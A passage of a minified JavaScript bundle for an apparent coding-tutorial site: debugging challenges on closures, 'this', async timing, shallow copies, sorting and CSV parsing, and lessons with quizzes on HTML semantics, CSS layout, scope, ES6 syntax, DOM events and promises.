}, 300);`,fixCheck:'output.includes("captured: 0,1,2")',win:"One keyword, one binding per iteration. `let` gives the closure its own `i`.",hints:[G(1,"How many `i` variables exist — one per iteration, or one for the whole function?"),G(2,"`var` is function-scoped. When the callbacks finally run, what is `i` by then?"),G(3,"Change `var i` to `let i`. Block scoping creates a fresh binding each pass.")],solution:"`var` is function-scoped, so all three callbacks close over the *same* `i`, which has already reached 3 by the time they fire — they print 3,3,3. `let` is block-scoped and creates a new binding per iteration, so each closure captures its own value. (The pre-ES6 fix was an IIFE that froze the value in a parameter.)",fix:`const captured = [];

for (let i = 0; i < 3; i++) {
  setTimeout(() => {
    captured.push(i);
  }, i * 40);
}

setTimeout(() => {
  console.log("captured:", captured.join(","));
}, 300);`},{id:"lost-this",title:"The Detached Method",brief:'The first call works. The second crashes with "Cannot read properties of undefined". Both should increment the same counter and print 1, then 2.',broken:`const counter = {
  count: 0,
  increment() {
    this.count += 1;
    return this.count;
  },
};

const bump = counter.increment;

console.log("method:", counter.increment());
console.log("detached:", bump());`,fixCheck:'output.includes("method: 1") && output.includes("detached: 2")',win:"`this` comes from the call site, not the definition. Binding the function kept the receiver attached.",hints:[G(1,"The function body didn't change between the two calls. What *did* change?"),G(2,"`bump()` is called with nothing before the dot. So what is `this` inside it?"),G(3,"Permanently attach the receiver: `const bump = counter.increment.bind(counter);`")],solution:"In strict mode a plain function call has `this === undefined`, so `this.count` throws. `counter.increment()` works because `counter` is the receiver. `this` is decided by *how* a function is called, not where it's written — fix it with `.bind(counter)`, an arrow function, or a class field. This is the classic bug behind broken event handlers and `setTimeout(this.method, 100)`.",fix:`const counter = {
  count: 0,
  increment() {
    this.count += 1;
    return this.count;
  },
};

const bump = counter.increment.bind(counter);

console.log("method:", counter.increment());
console.log("detached:", bump());`},{id:"missing-await",title:"The Unawaited Value",brief:"The score comes back from an async function as 7. This prints 0 — the value arrives, but too late to be read.",broken:`function fetchScore() {
  return Promise.resolve(7);
}

async function report() {
  let score = 0;
  fetchScore().then((n) => {
    score = n;
  });
  console.log("score:", score);
}

report();`,fixCheck:'output.includes("score: 7")',win:"`await` suspended the function until the value existed. `.then` only schedules work — it doesn't pause anything.",hints:[G(1,"Which line does `console.log` actually run *after*?"),G(2,"`.then(callback)` queues the callback. Does queuing it stop the current function?"),G(3,"In an `async` function you can simply wait: `const score = await fetchScore();`")],solution:"`.then()` registers a callback and returns immediately, so `console.log` runs while `score` is still 0 — the assignment happens on a later microtask. Inside an `async` function, `await` actually suspends execution until the promise settles: `const score = await fetchScore();`. A `.then` that only assigns a variable is almost always a missing `await` in disguise.",fix:`function fetchScore() {
  return Promise.resolve(7);
}

async function report() {
  const score = await fetchScore();
  console.log("score:", score);
}

report();`},{id:"shallow-copy",title:"The Shallow Copy",brief:'The function copies the user before editing it, yet the original keeps changing. "original" must still say ada after the update.',broken:`function updateName(user, name) {
  const copy = { ...user };
  copy.profile.name = name;
  return copy;
}

const user = { profile: { name: "ada", theme: "dark" } };
const updated = updateName(user, "grace");

console.log("original:", user.profile.name);
console.log("updated:", updated.profile.name);`,fixCheck:`${Gm(0)} === "original: ada" && output.includes("updated: grace")`,win:"Spread copies one level deep. `profile` was still the shared object — copying it too fixed the leak.",hints:[G(1,"`{ ...user }` makes a new object. What does `copy.profile` point at?"),G(2,"The copy has its own `profile` *reference*, but both references target the same nested object."),G(3,"Copy the level you mutate: `const copy = { ...user, profile: { ...user.profile } };`")],solution:"Object spread is shallow: `copy` is a new object whose `profile` property points at the *same* nested object as `user.profile`. Mutating `copy.profile.name` therefore edits both. Copy the level you mutate (`{ ...user, profile: { ...user.profile } }`), or use `structuredClone(user)` for a true deep copy. Every modern React state bug involving nested objects traces back to this.",fix:`function updateName(user, name) {
  const copy = { ...user, profile: { ...user.profile } };
  copy.profile.name = name;
  return copy;
}

const user = { profile: { name: "ada", theme: "dark" } };
const updated = updateName(user, "grace");

console.log("original:", user.profile.name);
console.log("updated:", updated.profile.name);`},{id:"sort-and-mutate",title:"Two Bugs, One Line",brief:"The numbers should come out ascending, and the original array must be left in the order it started. Right now neither is true.",broken:`const scores = [42, 8, 99, 15];

const sorted = scores.sort();

console.log("sorted:", sorted.join(","));
console.log("original:", scores.join(","));`,fixCheck:'output.includes("sorted: 8,15,42,99") && output.split("\\n")[1].trim() === "original: 42,8,99,15"',win:"A numeric comparator *and* a copy. `sort()` compares strings and reorders the array in place.",hints:[G(1,"Two separate problems here: the order is wrong, and so is the second line. Tackle them one at a time."),G(2,'Default `sort()` converts items to strings — so "15" sorts before "42". What would fix the ordering?'),G(3,"`sort()` also mutates in place. Copy first, then compare numerically: `[...scores].sort((a, b) => a - b)`.")],solution:"Two classic traps in one line. Default `sort()` compares *strings*, so [42,8,99,15] becomes [15,42,8,99] — always pass a comparator for numbers: `(a, b) => a - b`. It also sorts the array in place, so `scores` is reordered too; spread a copy first. Fix both: `const sorted = [...scores].sort((a, b) => a - b);`",fix:`const scores = [42, 8, 99, 15];

const sorted = [...scores].sort((a, b) => a - b);

console.log("sorted:", sorted.join(","));
console.log("original:", scores.join(","));`},{id:"csv-quoted-fields",title:"The Parser That Trusted Commas",brief:"The comment says it handles quoted fields and embedded commas. Three rows go in; the field counts that come out say otherwise. Row 2 is the quiet one.",broken:`function parseCSV(text) {
  // handles quoted fields and embedded commas — tested
  return text.trim().split("\\n").map((line) => line.split(","));
}

const rows = parseCSV('name,note\\n"Doe, Jane",hello\\nAda,');

rows.forEach((fields, i) => {
  console.log("row", i, "fields:", fields.length, JSON.stringify(fields));
});`,fixCheck:`output.includes('row 0 fields: 2 ["name","note"]') && output.includes('row 1 fields: 2 ["Doe, Jane","hello"]') && output.includes('row 2 fields: 2 ["Ada",""]')`,win:"A parser, not a splitter: quotes are state, not characters. Every row now has the field count the data actually has.",hints:[G(1,"Compare each printed field count with the raw row. Which value was supposed to be a single field but isn't?"),G(2,"A bare split(',') cannot tell a separator comma from a comma inside quotes — and an empty trailing field disappears when you trim and split."),G(3,"Walk the text character by character and track whether you are inside quotes; also emit a field when the line ends, even if it is empty.")],solution:'`split(\',\')` has no concept of quoting, so the embedded comma in "Doe, Jane" becomes a separator (3 fields instead of 2), and `trim()` plus a naive split drops the empty trailing field on row 2 (1 field instead of 2). The fix is a real (small) parser: iterate the characters, keep a `quoted` flag, treat `""` as an escaped quote, and push the pending field when a line ends — empty or not. Quoted-field parsing is the canonical lesson in why parsing text with `split` is a trap.',fix:`function parseCSV(text) {
  const rows = [];
  let row = [];
  let field = "";
  let quoted = false;

  for (let i = 0; i < text.length; i++) {
    const ch = text[i];
    if (quoted) {
      if (ch === '"' && text[i + 1] === '"') {
        field += '"';
        i++;
      } else if (ch === '"') {
        quoted = false;
      } else {
        field += ch;
      }
    } else if (ch === '"') {
      quoted = true;
    } else if (ch === ",") {
      row.push(field);
      field = "";
    } else if (ch === "\\n") {
      row.push(field);
      rows.push(row);
      row = [];
      field = "";
    } else {
      field += ch;
    }
  }

  if (field !== "" || row.length) {
    row.push(field);
    rows.push(row);
  }

  return rows;
}

const rows = parseCSV('name,note\\n"Doe, Jane",hello\\nAda,');

rows.forEach((fields, i) => {
  console.log("row", i, "fields:", fields.length, JSON.stringify(fields));
});`,diagnosis:{prompt:"What kind of defect is this?",codes:["SL","EC","RC","CX"],answer:"SL"}},{id:"debounced-search-queue",title:"The Queue That Answered Backwards",brief:"An agent-drafted search queue with two defects. In the log you can see a request nobody wanted, and a final value that belongs to an older query.",broken:`const log = [];
let applied = [];

function fetchResults(query) {
  const latency = (5 - query.length) * 30;
  log.push("request: " + JSON.stringify(query));
  return new Promise((resolve) =>
    setTimeout(() => resolve([query + "-result"]), latency)
  );
}

function search(query) {
  fetchResults(query).then((items) => {
    applied = items;
    console.log("applied:", applied.join(","));
  });
}

search("a");
search("");
search("alp");

setTimeout(() => {
  console.log("requests:", log.join(" | "));
  console.log("final:", applied.join(","));
}, 250);`,fixCheck:`!output.includes('request: ""') && output.includes("final: alp-result")`,win:"Two fixes, one loop: the empty query never becomes a request, and only the newest response is allowed to become state.",hints:[G(1,"Read the request log first, then watch the order the results land in. Which query's results survive, and should they?"),G(2,"Two separate defects: one request should never have been made, and responses arrive out of order — a slow early query can overwrite a fast later one."),G(3,"Return early when the query is falsy, then stamp each request with an id and drop any response whose id is not the latest.")],solution:"Two planted bugs, one shape. (1) The empty string is a valid input to the queue but not a valid query: `search('')` fires a network request for nothing and its (slow) response can even win. Return early on a falsy query. (2) Responses have no identity, so a slower earlier request can resolve after a faster later one and overwrite fresher state — classic staleness. Keep an incrementing request id and ignore any response that is not the newest. Both are the same discipline: decide *before* doing work whether the work should happen at all.",fix:`const log = [];
let applied = [];
let latest = 0;

function fetchResults(query) {
  const latency = (5 - query.length) * 30;
  log.push("request: " + JSON.stringify(query));
  return new Promise((resolve) =>
    setTimeout(() => resolve([query + "-result"]), latency)
  );
}

function search(query) {
  if (!query) return;            // empty query: no request at all
  const id = ++latest;
  fetchResults(query).then((items) => {
    if (id !== latest) return;   // stale response: drop it
    applied = items;
    console.log("applied:", applied.join(","));
  });
}

search("a");
search("");
search("alp");

setTimeout(() => {
  console.log("requests:", log.join(" | "));
  console.log("final:", applied.join(","));
}, 250);`,diagnosis:{prompt:"What is the primary category of this draft's defects?",codes:["RC","EC","SL","CX"],answer:"RC"}}],SP=kP.map(e=>({...e,diagnosis:e.diagnosis??bP[e.id]})),TP=[...SP,...xP],CP=new Map(TP.map(e=>[e.id,e]));function vi(e){const t=CP.get(e);if(!t)throw new Error(`Unknown debug challenge "${e}" — add it to src/data/debug-challenges.ts`);return t}const AP={id:"web",title:"Web Development Foundations",blurb:"HTML5, CSS3, and modern JavaScript — the bedrock every frontend stands on.",numeral:"Ⅰ",lessons:[{id:"html-semantic",title:"Semantic HTML: Pages That Mean Something",minutes:10,reading:!0,body:"HTML isn't about making things *look* right — it's about saying what things **are**. Semantic elements tell browsers, search engines, and screen readers what role each region plays.\n\n```\n<body>\n  <header>    <!-- site banner, nav lives here -->\n    <nav>…</nav>\n  </header>\n  <main>      <!-- one per page: the unique content -->\n    <article> <!-- self-contained: a post, a card, a product -->\n      <h1>Title</h1>\n      <section> <!-- thematic grouping inside -->\n        <h2>Sub-heading</h2>\n      </section>\n    </article>\n    <aside>   <!-- tangential: related links, ads -->\n    <footer>  <!-- meta info, copyright -->\n  </main>\n</body>\n```\n\n**Why it matters:**\n- **Accessibility** — screen readers navigate by landmarks. A page of `<div>`s is a maze; a semantic page is a building with signs.\n- **SEO** — search engines weight content inside `<article>` and headings more heavily.\n- **Maintainability** — `<main>` tells the next developer more than `<div class=\"main-content\">` ever could.\n\n**The rules of thumb:**\n1. One `<h1>` per page, headings in order — never skip levels for styling (use CSS for that).\n2. `<main>` appears once; `<article>` and `<section>` can nest.\n3. A `<div>` is not a failure — use it when nothing semantic fits. Use `<section>` only when it has a heading.\n\n**The box model** underpins every layout: `margin` (space outside) → `border` → `padding` (space inside) → `content`. `box-sizing: border-box` makes `width` include padding and border, which is what everyone wants — modern resets apply it globally.",quiz:[{q:"Which element should appear exactly once per page?",options:["<section>","<article>","<main>","<div>"],answer:2,explanation:"<main> wraps the unique primary content of the page — duplicates confuse landmarks."},{q:"What does box-sizing: border-box do?",options:["Adds a border to every box","Makes width/height include padding and border","Rounds all corners","Centers the element"],answer:1,explanation:"With border-box, width includes padding + border, so boxes stay the size you asked for."},{q:"Where does the primary page navigation belong?",options:["<footer>","<nav> inside <header>","<aside>","<main>"],answer:1,explanation:"Site-level navigation is a landmark inside the banner — <nav> within <header>."},{q:"Which is the RIGHT order of box model layers, outside to in?",options:["content → padding → border → margin","margin → border → padding → content","padding → margin → content → border","border → margin → padding → content"],answer:1,explanation:"From outside in: margin, border, padding, content."},{q:"When is a <div> the right choice?",options:["Never — always use semantic tags","When no semantic element matches the content's meaning","Only inside <footer>","For every heading"],answer:1,explanation:"Divs are honest workhorses — use them when nothing more specific describes the content."}]},{id:"box-model-deep",title:"The Box Model, Margins & Collapsing",minutes:9,sort:{prompt:"Order the box model layers from the outside in.",items:["margin — space pushed away outside the border","border — the visible edge of the box","padding — space between the border and the content","content — the text, image, or child elements"],explanation:"From outside in: margin, border, padding, content. That is also the order browsers paint them, which is why margins collapse but padding never does."},reading:!0,body:`Every element is a **box of nested layers** — margin, border, padding, content — and layout bugs are usually box-model bugs.

\`\`\`
.card {
  width: 300px;
  padding: 20px;
  border: 2px solid;
  /* content-box: real width = 300 + 40 + 4 = 344px 😱 */
  box-sizing: border-box; /* real width = 300px ✓ */
}
\`\`\`

Modern resets make \`border-box\` the default — but know what the legacy behavior is, because you'll meet it in old code.

**Margin collapsing** surprises everyone: vertical margins between siblings **merge** into the larger one instead of adding. Two stacked cards with 20px margins sit 20px apart, not 40px.

\`\`\`
/* margins collapse here */
.card + .card { margin-top: 20px; }

/* they don't collapse across padding/border/flex/grid */
.stack { display: grid; gap: 20px; }
\`\`\`

**The collapse rules that matter:**
1. Adjacent siblings collapse (max wins)
2. Parent and first/last child collapse — unless the parent has padding/border between them
3. Flex/grid containers never collapse margins — one reason they're layout safe-havens
4. Horizontal margins never collapse

**Auto margins** center blocks: \`margin: 0 auto\` on a fixed-width element is the classic centering move.

Debug habit: in DevTools, the box-model diagram at the bottom of the Elements panel shows every layer's exact pixels — read it before you guess.`,quiz:[{q:"With box-sizing: content-box, a 300px-wide element with 20px padding and 2px border is really…",options:["300px","322px","344px","360px"],answer:2,explanation:"300 + 40 (padding) + 4 (border) = 344px — the classic surprise."},{q:"Two siblings with margin-bottom: 20px and margin-top: 30px sit apart by…",options:["50px","30px","20px","10px"],answer:1,explanation:"Vertical margins collapse to the max — 30px."},{q:"Which container never collapses child margins?",options:["display: block","display: flex","display: inline","display: table-row"],answer:1,explanation:"Flex and grid establish new formatting contexts — no collapsing inside."},{q:"margin: 0 auto centers an element when…",options:["The element has a width and is block-level","The element is inline","Always, even full-width","Only inside flex containers"],answer:0,explanation:"Auto margins eat free horizontal space — which requires a width to be free."},{q:"The fastest way to see which layer ate your spacing?",options:["Guess and add !important","The box-model diagram in DevTools","console.log the element","Delete CSS until it looks right"],answer:1,explanation:"The diagram shows computed margin/border/padding/content pixel-exactly."}]},{id:"responsive-deep",title:"Responsive Design: Mobile-First in Practice",minutes:10,reading:!0,body:`Mobile-first isn't a style preference — it's a **constraint ordering**: design for the smallest viewport, then *add* complexity as space allows.

\`\`\`
/* base = mobile: single column, full width */
.layout { display: grid; gap: 16px; }

@media (min-width: 768px) {
  .layout { grid-template-columns: 240px 1fr; }
}
\`\`\`

**Why min-width beats max-width:** with min-width, base styles are the simple case and queries layer *on top*; with max-width you end up un-doing desktop styles for phones — fighting your own CSS.

**Fluid before breakpoints.** Breakpoints are the spice, not the meal:

\`\`\`
.hero-title { font-size: clamp(2rem, 5vw + 1rem, 4.5rem); }
.gallery { grid-template-columns: repeat(auto-fill, minmax(220px, 1fr)); }
img, video { max-width: 100%; height: auto; }
\`\`\`

\`clamp(min, preferred, max)\` gives fluid typography with safety rails; \`auto-fill + minmax\` builds responsive grids with zero media queries.

**Real-device checklist:**
- Touch targets ≥ 44×44px — fingers, not cursors
- Viewport meta tag present: \`<meta name="viewport" content="width=device-width, initial-scale=1">\`
- Test with DevTools device emulation AND a real phone — emulation hides scroll/perf issues
- Respect \`prefers-reduced-motion\` for animations
- Don't disable zoom — accessibility failure

**Testing ritual:** resize continuously from 320px up; every breakage you find is a missing fluid rule or a breakpoint you actually need.`,quiz:[{q:"The core mobile-first technique is…",options:["max-width queries shrinking desktop CSS","Base styles for small screens, min-width queries adding complexity","Separate mobile site on m.example.com","Zooming out the desktop design"],answer:1,explanation:"Enhance upward instead of repairing downward."},{q:"clamp(2rem, 5vw + 1rem, 4.5rem) does what?",options:["Picks 5vw always","Fluid size between 2rem and 4.5rem following viewport width","Rounds to the nearest rem","Sets minimum only"],answer:1,explanation:"Preferred value scales with vw, clamped to hard min/max rails."},{q:"Minimum comfortable touch target size?",options:["16×16px","24×24px","44×44px","100×100px"],answer:2,explanation:"Apple/Android guidelines converge around 44px for finger-sized targets."},{q:"img, video { max-width: 100%; height: auto } prevents…",options:["Slow loading","Media overflowing its container on small screens","Blurry images","CORS errors"],answer:1,explanation:"The classic responsive-media rule — never wider than the box, aspect preserved."},{q:"Why also test on a real phone?",options:["DevTools emulation is perfect","Emulation can't show real touch, scroll physics, or device performance","Phones need special CSS files","You don't need to"],answer:1,explanation:"Real devices surface touch latency, viewport quirks, and CPU limits emulation hides."}]},{id:"css-layout",title:"Flexbox, Grid & Responsive Strategy",minutes:12,reading:!0,sandbox:!0,body:`Two layout systems, two mindsets:

**Flexbox** — one dimension at a time. Content flows along a main axis; great for toolbars, nav rows, centering.

\`\`\`
.toolbar {
  display: flex;
  justify-content: space-between; /* main axis */
  align-items: center;            /* cross axis */
  gap: 12px;
}
\`\`\`

**Grid** — two dimensions. You design the *structure* and place items into cells; great for page layouts and card walls.

\`\`\`
.gallery {
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
  gap: 16px;
}
\`\`\`

That one \`grid-template-columns\` line is a whole responsive card wall — no media queries needed, because \`auto-fill\` + \`minmax\` decides how many columns fit.

**The decision rule:** choosing between flex and grid is about the *relationship* of items. Items adjusting to each other? Flex. Items aligning to a shared structure? Grid.

**Mobile-first media queries** — write the phone layout as the default, then enhance as space grows:

\`\`\`
.sidebar { width: 100%; }            /* base: mobile */

@media (min-width: 768px) {          /* tablet and up */
  .layout { display: grid; grid-template-columns: 240px 1fr; }
}
\`\`\`

Use \`min-width\` queries (not \`max-width\`), let content wrap naturally, and never test on one breakpoint — resize continuously.`,quiz:[{q:"Your items should flow in a row and shrink to fit. Best tool?",options:["Grid","Flexbox","Floats","Position absolute"],answer:1,explanation:"One-dimensional content-driven flow is exactly what Flexbox was designed for."},{q:"What does repeat(auto-fill, minmax(220px, 1fr)) achieve?",options:["Exactly 220px columns always","As many ≥220px columns as fit, sharing space equally","One column on mobile","It's invalid CSS"],answer:1,explanation:"auto-fill packs the row with the most ≥220px tracks that fit; 1fr distributes leftover space."},{q:"justify-content aligns items along which axis?",options:["Cross axis","Main axis","The z-axis","The grid baseline"],answer:1,explanation:"justify-* works on the main axis; align-* works on the cross axis."},{q:"In mobile-first CSS, media queries should mostly use…",options:["max-width","min-width","both equally","no queries at all"],answer:1,explanation:"min-width lets the base styles be mobile and layers on enhancements as space grows."},{q:"Grid or Flexbox for a full-page app shell (sidebar + content + header)?",options:["Flexbox — rows only","Grid — it defines rows AND columns","Neither; use tables","Flexbox nested 10 deep"],answer:1,explanation:"Two-dimensional structure with named regions is Grid's home turf."}]},{id:"scope-context",title:"Execution Context & Scope: let, const, var",minutes:10,body:'JavaScript runs your code in **execution contexts**. Each function call creates a new context with its own scope — a sandbox of visible variables.\n\n```\nconst global = "visible everywhere";\n\nfunction outer() {\n  const outerVar = "visible in outer";\n  function inner() {\n    console.log(global + " and " + outerVar); // closure!\n  }\n  inner();\n}\n```\n\nWhen `inner` runs, JavaScript walks up the **scope chain** until it finds each name. Functions remember where they were *born* — that\'s a **closure**, and it\'s how callbacks and hooks keep working after their parent finished.\n\n**let vs const vs var:**\n\n- `var` is function-scoped and **hoisted** (declared everywhere in the function, initialized to `undefined`) — a footgun. Modern code avoids it.\n- `let` and `const` are block-scoped (`{}`-scoped) and sit in the "temporal dead zone" until their declaration line — the engine throws instead of quietly giving you `undefined`.\n- Rule: **`const` by default, `let` when it must change, `var` never.**\n\n```\nif (true) {\n  let x = 1;\n  const y = 2;\n  var z = 3;      // leaks outside the block!\n}\nconsole.log(z);   // 3 — surprise\n// console.log(x); // ReferenceError — contained\n```',starter:`function makeCounter() {
  let count = 0; // private — trapped in this closure
  return function increment() {
    count = count + 1;
    return count;
  };
}

const nextCount = makeCounter();
console.log(nextCount()); // 1
console.log(nextCount()); // 2
console.log(nextCount()); // 3

// TODO: fix the loop-scope bug — this prints 3, 3, 3
const printDelayed = [];
for (var i = 0; i < 3; i++) {
  printDelayed.push(() => i); // each callback reads the SAME var i
}
console.log(
  "loop captured:",
  printDelayed.map((capture) => capture()).join(",")
);`,check:{expr:"output.includes('1') && output.includes('3') && output.includes('loop captured: 0,1,2')",hint:"Keep the counter working, and change var i to let i so each iteration keeps its own value."},predict:[{prompt:"What does this print — and why?",code:`for (var i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 0);
}`,options:["0, 1, 2 — each callback captures its own i","3, 3, 3 — var is function-scoped, so all three closures share one i that ends at 3","0, 1, 2, then 3","Nothing — the loop finishes before setTimeout registers"],answer:1,explanation:"var has one binding for the whole function; by the time the timers fire, i is 3. Swap var for let and you get 0, 1, 2 — let creates a fresh binding per iteration."},{prompt:"And what does this classic return?",code:`function makeCounter() {
  let count = 0;
  return function () {
    count += 1;
    return count;
  };
}
const c = makeCounter();
c();
c();
console.log(c());`,options:["0","1","3","undefined"],answer:2,explanation:"The returned function closes over count, which stays alive between calls. Two calls already ran, so the third returns 3. That persistent private state is the whole power of closures."}],quiz:[{q:"What does the temporal dead zone mean?",options:["let/const variables exist but throw if read before declaration","Garbage collection pauses","The event loop is blocked","Old browsers crash"],answer:0,explanation:"Between scope entry and the declaration line, touching a let/const throws instead of returning undefined."},{q:"A closure is…",options:["A finished function","A function remembering variables from where it was created","A private class field","The end of a loop"],answer:1,explanation:"Functions capture their birthplace's scope — that's why makeCounter's count survives."},{q:"Which loop printed 3, 3, 3 in the old days, and why?",options:["for with let — blocks share state","for with var — one function-scoped variable","while loops always do this","It was a browser bug"],answer:1,explanation:"var is one shared binding; by the time callbacks run, i is 3. let creates a fresh binding per iteration."},{q:"Default declaration choice in modern JS?",options:["var","let","const","whatever compiles"],answer:2,explanation:"const by default communicates intent; switch to let only when reassignment is needed."},{q:"Block scope means…",options:["Variables live inside any { } block","Variables live inside functions only","Variables live on the window","Variables live in modules"],answer:0,explanation:"let/const bind to the nearest enclosing block, not the whole function like var."}]},{id:"es6-syntax",title:"ES6+ Power Syntax: Arrows & Destructuring",minutes:9,body:`Modern JavaScript reads differently than the old tutorials. Two upgrades you'll use every single day:

**Arrow functions** — compact, and they *don't create their own \`this\`*:

\`\`\`
// old
const doubled = nums.map(function (n) { return n * 2; });

// modern
const doubled = nums.map((n) => n * 2);
\`\`\`

**Destructuring** — unpack in one step:

\`\`\`
const { name, level } = player;   // objects: by key
const [first, second] = pair;     // arrays: by position
const { id, ...rest } = payload;  // rest properties
\`\`\`

Combine them with default values and parameters:

\`\`\`
function renderUser({ name, role = "member" }) {
  console.log(name + " (" + role + ")");
}
\`\`\`

**The spread operator** (\`...\`) copies and merges without mutating — a habit that matters the moment you touch React:

\`\`\`
const updated = { ...state, score: state.score + 10 };
const merged = [...a, ...b];
\`\`\`

Below: refactoring practice from old-school to modern style.`,starter:`// Old-school above, modern syntax below. Finish both TODOs.
const users = [
  { name: "Ada", points: 90 },
  { name: "Lin", points: 75 },
  { name: "Sam", points: 55 },
];

const winners = users.filter(function (u) { return u.points >= 70; });
const names = [];
for (var i = 0; i < winners.length; i++) {
  names.push(winners[i].name);
}
console.log("winners:", names.join(", "));

// TODO 1: in ONE line — an arrow plus destructuring — log every winner, so
// this prints "Ada: 90" and "Lin: 75". Start from winners.forEach(...)

// TODO 2: boost a copy by 10 points. The last two lines must print 90 and 100,
// which means boosted has to be a COPY, not another name for state.
const state = { points: 90 };
const boosted = state;
boosted.points += 10;
console.log("state.points:", state.points);
console.log("boosted.points:", boosted.points);`,check:{expr:"output.includes('Ada: 90') && output.includes('Lin: 75') && output.includes('state.points: 90') && output.includes('boosted.points: 100')",hint:"winners.forEach(({ name, points }) => console.log(name + ': ' + points)); then const boosted = { ...state }; — spread makes an independent copy."},predict:[{prompt:"What does this destructuring produce?",code:`const { name, tags: [first] } = { name: "ada", tags: ["eng", "ops"] };
console.log(name, first);`,options:['ada ["eng", "ops"]',"ada eng","undefined undefined","It throws — you can't nest destructuring"],answer:1,explanation:"`tags: [first]` pulls the tags property AND destructures its first element. Nested destructuring reads one level deeper per bracket."},{prompt:"What does this spread do?",code:`const base = { role: "member", admin: false };
const user = { ...base, admin: true };
console.log(user.role, user.admin);`,options:["member false","member true","true true","It mutates base"],answer:1,explanation:"Later keys win: the spread copies base first, then admin: true overrides it. This 'defaults then overrides' pattern is everywhere in real code."}],quiz:[{q:"Arrow functions differ from regular functions because they…",options:["Are always faster","Don't create their own this binding","Can't take parameters","Return undefined"],answer:1,explanation:"Arrows inherit this from their surroundings — ideal for callbacks."},{q:"const { a, b } = obj; is equivalent to…",options:["const a = obj; const b = obj;","const a = obj.a; const b = obj.b;","const [a, b] = obj;","Nothing — invalid syntax"],answer:1,explanation:"Object destructuring pulls properties by key."},{q:"What does [...items, newItem] do?",options:["Mutates items","Creates a new array with newItem appended","Throws if items is empty","Flattens newItem"],answer:1,explanation:"Spread makes a shallow copy — the original stays untouched (immutability)."},{q:"function f({ x = 5 }) {} — when is the default used?",options:["When x is 0","When x is undefined (or missing)","When x is null","Always"],answer:1,explanation:"Defaults trigger on undefined only — 0 and null are real values."},{q:"const { id, ...rest } = data; — what is rest?",options:["A syntax error","A new object with everything except id","The value of id","An array of keys"],answer:1,explanation:"Rest properties collect the leftovers into a fresh object."}]},{id:"dom-events",title:"DOM Traversal & Event Delegation",minutes:11,reading:!0,body:`The DOM is a tree you can walk:

\`\`\`
list.children            // direct children
item.parentElement       // walk up
item.closest(".card")    // nearest ancestor matching a selector
item.querySelector("p")  // search below
item.previousElementSibling
\`\`\`

**Events don't stop where you click.** They travel in two phases: **capture** (down from the document) then **bubble** (back up to the document). \`addEventListener(type, fn, { capture: true })\` chooses the downward trip; by default you get bubbling.

**Event delegation** exploits bubbling — attach ONE listener to a stable parent instead of many listeners on changing children:

\`\`\`
list.addEventListener("click", (event) => {
  const btn = event.target.closest("button");
  if (!btn) return;                       // click landed on the list itself
  console.log("clicked:", btn.dataset.action);
});
\`\`\`

Why this wins:
1. **Dynamically added items work instantly** — no re-binding after every render.
2. **100 list rows = 1 listener**, not 100.
3. **Removing elements can't leak listeners.**

Read \`event.target\` (what was actually hit) vs \`event.currentTarget\` (what the listener is attached to). And call \`event.preventDefault()\` to stop default behaviors — like a form actually submitting.`,predict:[{prompt:"This mini event system prints what? (Same idea as DOM listeners)",code:`const listeners = {};
function on(evt, fn) {
  (listeners[evt] ??= []).push(fn);
}
function emit(evt) {
  for (const fn of listeners[evt] ?? []) fn(evt);
}
on("click", (e) => console.log("A:", e));
on("click", (e) => console.log("B:", e));
emit("click");`,options:["A: click only — the second on() replaces the first","B: click then A: click — last registered fires first","A: click then B: click — handlers fire in registration order","Nothing — emit needs two arguments"],answer:2,explanation:"Each event maps to an ARRAY of listeners; emit walks it front to back. The DOM does exactly this — addEventListener appends, it never replaces (that's the old onclick model)."}],quiz:[{q:"Event delegation means…",options:["One listener on a parent handling clicks for its children","Each element gets its own listener","Delegating events to the server","Using capture phase only"],answer:0,explanation:"You exploit bubbling: the parent hears child clicks and inspects event.target."},{q:"Why does event.target.closest('button') matter in a delegated handler?",options:["It's faster than addEventListener","The click may land on a child inside the button, not the button itself","It prevents bubbling","It creates the button"],answer:1,explanation:"closest() walks up from the actual target to find the actionable ancestor."},{q:"During bubbling, an event travels…",options:["document → target","target → document (up through ancestors)","Nowhere — it's instant","Only between siblings"],answer:1,explanation:"Capture goes down, bubble goes back up — bubbling is the upward phase."},{q:"You add 50 <li> to a list with a delegated listener. How many new listeners do you add?",options:["50","1","0","51"],answer:2,explanation:"Zero — the parent's existing listener already covers future children. That's the payoff."},{q:"Which walks UP the tree to the nearest match?",options:["el.querySelector('.x')","el.closest('.x')","el.children","el.firstChild"],answer:1,explanation:"closest() searches ancestors; querySelector searches descendants."}]},{id:"async-promises",title:"Promises & async/await",minutes:11,body:`Slow things (network, timers, files) can't block a single-threaded page. **Promises** are IOUs for future values.

\`\`\`
const p = fetch("/api/user");   // starts now, resolves later
p.then((res) => console.log("done", res));
console.log("this runs FIRST"); // sync code never waits
\`\`\`

A promise is **pending** → then either **fulfilled** (\`.then\` runs) or **rejected** (\`.catch\` runs).

**async/await** is promise syntax that *reads* like synchronous code:

\`\`\`
async function loadUser() {
  try {
    const res = await fetch("/api/user");
    const data = await res.json();   // res.json() is ALSO a promise
    return data;
  } catch (err) {
    console.error("failed:", err);
  }
}
\`\`\`

**Rules that trip everyone up:**
1. \`await\` only works inside \`async\` functions (and top-level in modules).
2. \`await\` pauses *that function*, not the whole page — the event loop keeps spinning.
3. Sequential awaits = total of both times. Independent work? Run it in parallel:

\`\`\`
const [user, posts] = await Promise.all([getUser(), getPosts()]);
\`\`\`

Try the playground — \`sleep()\` is a promise-based timer, so you can watch async ordering with zero network.`,starter:`// sleep(ms) returns a promise — a stand-in for real I/O
function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

async function brewTea() {
  console.log("1. kettle on");
  await sleep(100);
  console.log("2. water boiled");
  await sleep(100);
  console.log("3. tea steeped");
  return "🍵 ready";
}

console.log("0. order placed");
brewTea().then((result) => console.log("4.", result));
console.log("5. (still free to do other work!)");

// TODO: run two brews in PARALLEL with Promise.all
// and log how the total wait is one brew, not two
async function main() {
  const first = await brewTea();
  const second = await brewTea();
  console.log("batch done:", first + " + " + second);
}
main();`,check:{expr:"output.includes('order placed') && output.includes('batch done') && output.indexOf('2. water boiled') > output.lastIndexOf('1. kettle on')",hint:"Both brews must be in flight at once: with Promise.all the second '1. kettle on' still lands before the first '2. water boiled'. Awaiting them one after the other serialises the waits — the second brew only starts once the first is finished."},predict:[{prompt:"In what order do these log?",code:`console.log("start");
setTimeout(() => console.log("timeout"), 0);
Promise.resolve().then(() => console.log("promise"));
